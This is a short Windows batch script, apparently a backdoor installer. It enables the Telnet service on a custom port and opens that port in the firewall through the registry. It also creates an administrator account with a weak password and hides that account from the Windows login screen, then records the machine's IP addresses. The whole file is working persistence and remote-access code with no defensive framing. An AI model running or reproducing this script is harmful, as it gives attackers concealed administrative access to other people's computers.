@echo off

::start telnet
set myport=223
sc config TlntSvr start= auto
net start TlntSvr 
tlntadmn config port %myport%
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v %myport%:TCP /t reg_sz /d %myport%:TCP:*:Enabled:telnet /f

::add hide user
set myuser=user01
set mypw=user01
net user %myuser% %mypw% /add
net user %myuser% %mypw%
net localgroup administrators %myuser% /add
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %myuser% /t reg_dword /d 00000000 /f

::output ip
set myfile=d:
for /f "delims=" %%i in ('ipconfig^|find "IP Address"')do (
echo %%i>> %myfile%
)
echo.>>%myfile%